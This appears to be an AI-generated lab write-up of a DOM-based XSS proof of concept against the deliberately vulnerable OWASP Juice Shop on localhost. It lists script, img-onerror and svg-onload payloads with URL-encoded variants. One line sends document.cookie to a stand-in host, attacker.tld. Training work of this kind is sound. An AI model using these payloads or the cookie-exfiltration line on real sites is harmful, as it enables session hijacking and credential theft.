real-world offensive security researcher’s PoC, while keeping that cool, hacker-lab tone you want.

markdown
Copy
Edit
# 🧠 DOM-Based XSS via URL Parameter Injection (Method-2)
_Exploit Type: Client-Side DOM-Based Cross-Site Scripting (Reflected via URL fragment)_

---

## 🔍 Recon Phase: Entry Point Discovery

**Target Application:**  
OWASP Juice Shop running on:
http://localhost:3000/

mathematica
Copy
Edit

**Suspicion Vector:**  
Query parameter in URL fragment:
http://localhost:3000/#/search?q=test

markdown
Copy
Edit

**Action:**  
1. Open Developer Tools → `Elements` tab  
2. Search for the value `"test"`  
3. Observe DOM sinks where user input is reflected

**Identified Sinks:**  
- `innerHTML`
- `document.write()`
- `jQuery.html()`

💡 *All dangerous if used with untrusted user input and no sanitization.*

---

## 💣 Exploitation Phase: Payload Deployment

### Goal:  
Trigger arbitrary JavaScript execution via malicious payload passed into the `q` parameter.

### Step 1: Craft Payloads

> Targeting reflection context, escaping HTML or attribute boundaries, and executing JS using event handlers or inline scripts.

```bash
http://localhost:3000/#/search?q=<script>alert(1)</script>
http://localhost:3000/#/search?q="><img src=x onerror=alert(1)>
http://localhost:3000/#/search?q="><svg/onload=alert(1)>
Step 2: Encoding (Optional for stealth/persistence)
bash
Copy
Edit
http://localhost:3000/#/search?q=%3Cscript%3Ealert(1)%3C/script%3E
http://localhost:3000/#/search?q=%22%3E%3Csvg/onload%3Dalert(1)%3E
Exploitation Techniques:
DOM sink abuse (no backend filter involvement)

HTML attribute breakout

Event handler injection (onerror, onload)

JavaScript execution in browser context

✅ Expected Behavior
Browser Pop-up: alert(1) executes immediately on page load.

DOM Reflects Payload: View source or Elements tab to verify unsanitized injection.

Challenge Banner Triggered: “You successfully solved the Bonus Payload challenge.”

🧪 Optional Verification (Advanced)
Monitor JavaScript Execution:
javascript
Copy
Edit
console.log(document.querySelector('body').innerHTML);
Cookie/Session Harvest (Simulated):
html
Copy
Edit
<script>fetch('http://attacker.tld/log?cookie=' + document.cookie)</script>
⚠️ Use in isolated lab environments only. This simulates real-world XSS abuse but must not be used against live or unauthorized targets.

📸 Evidence Collection
Screenshot Instructions:
Ensure alert(1) is still active or visible in the browser

Navigate to:

bash
Copy
Edit
http://localhost:3000/#/score-board
Verify challenge marked as ✅ solved

Take screenshot using:

Shift + PrtSc (Linux/Windows)

Cmd + Shift + 4 (Mac)

Save as:
bash
Copy
Edit
DOM-XSS-URL-Param-Payload.png
🔐 Risk Analysis (For Report)
Vector	Impact	CVSS Base Score
DOM XSS	Full JS Execution	6.1 – 7.4 (Medium to High)

Impact Scope: Session Hijacking, Credential Theft, Defacement, Browser Exploitation

Mitigation: Use input sanitization libraries (DOMPurify), avoid dangerous sinks, apply CSP headers

📁 Folder Structure
mathematica
Copy
Edit
OWASP-Juice-Shop-Bonus-Payload/
└── Method-2-URL-Param-Injection/
    ├── Read-Me-URL-Parameter.md
    ├── To-Do-URL-Parameter.md
    ├── payload.txt
    ├── DOM-XSS-URL-Param-Payload.png
🧾 GitOps: Version Control the Exploit
bash
Copy
Edit
cd ~/juice-shop/OWASP-Juice-Shop-Bonus-Payload/Method-2-URL-Param-Injection

# Stage all exploit artifacts
git add .

# Commit with context
git commit -m "🚀 DOM-Based XSS via URL Parameter Injection – payloads, PoC, and evidence added"

# Push to GitHub
git push origin main
🎯 Final Outcome
 Entry point discovered via reflected param

 DOM sink exploited with malicious payload

 JavaScript executed in browser

 Screenshot proof captured

 Challenge marked as solved

 Git repo updated with artifacts

💡 Hack smarter. Document harder. Automate later.
